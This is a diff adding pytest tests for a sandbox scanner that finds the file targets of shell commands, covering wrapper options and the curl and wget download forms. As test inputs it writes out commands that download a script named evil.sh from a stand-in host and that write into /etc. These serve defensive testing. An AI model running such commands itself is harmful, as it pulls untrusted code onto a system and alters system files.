@@ -392,3 +392,63 @@ class TestLongOptionAbbreviation:
         ):
             scan = scan_shell_write_targets(command)
             assert scan.refuse_reason is None, f"{command!r} was refused"
+
+    def test_double_dash_ends_wrapper_options(self) -> None:
+        # A regression from the abbreviation pass: `--` was skipped for every
+        # wrapper, so the *wrapped command's* argv (`--foo`) hit the
+        # unknown-long refuse. `env -- --foo bash` is a false positive.
+        scan = scan_shell_write_targets("env -- --foo bash")
+        assert scan.refuse_reason is None
+
+    def test_double_dash_then_inline_shell_still_refused(self) -> None:
+        # `env` still permits NAME=value after `--`; the inline shell behind
+        # them must still be refused.
+        scan = scan_shell_write_targets("env -- FOO=bar bash -c 'echo x'")
+        assert scan.refuse_reason is not None
+
+
+class TestUnnamedWriteTargets:
+    """Writes whose target is chosen by the server, or named by an option
+    the handlers did not know.
+
+    ``curl -O`` / ``wget URL`` write a *remote-derived* filename into the
+    sandbox cwd; the name cannot be statically resolved, so per the module's
+    fail-closed contract they must be refused, not passed with empty targets.
+    ``--output-dir`` / ``-P`` / wget's ``-o`` log are nameable targets that
+    were silently dropped.
+    """
+
+    @pytest.mark.parametrize("command", [
+        "curl -O http://h/evil.sh",
+        "curl --remote-name http://h/evil.sh",
+        "curl -sO http://h/evil.sh",
+        "curl -O --output-dir /etc http://h/x",
+        "wget http://h/evil.sh",
+        "wget -q http://h/evil.sh",
+    ])
+    def test_remote_derived_write_is_refused(self, command: str) -> None:
+        assert scan_shell_write_targets(command).refuse_reason is not None
+
+    def test_curl_to_stdout_is_not_a_write(self) -> None:
+        # curl with no `-o`/`-O` streams to stdout — nothing to check.
+        assert scan_shell_write_targets("curl http://h/x").refuse_reason is None
+
+    def test_wget_spider_is_not_a_write(self) -> None:
+        assert scan_shell_write_targets("wget --spider http://h/x").refuse_reason is None
+
+    @pytest.mark.parametrize("command,expected", [
+        ("wget -o /tmp/wget.log http://h/x", "/tmp/wget.log"),
+        ("wget --output-file=/var/log/w.log http://h/x", "/var/log/w.log"),
+        ("wget -P /etc http://h/x", "/etc"),
+        ("wget --directory-prefix=/etc http://h/x", "/etc"),
+        ("curl --output-dir /etc http://h/x", "/etc"),
+        ("curl --output-dir=/etc http://h/x", "/etc"),
+        ("sed -i -- /etc/weird", "/etc/weird"),
+        ("tar --delete --file=/etc/x.tar m", "/etc/x.tar"),
+    ])
+    def test_named_target_option_is_detected(
+        self, command: str, expected: str
+    ) -> None:
+        scan = scan_shell_write_targets(command)
+        assert scan.refuse_reason is None
+        assert expected in scan.targets
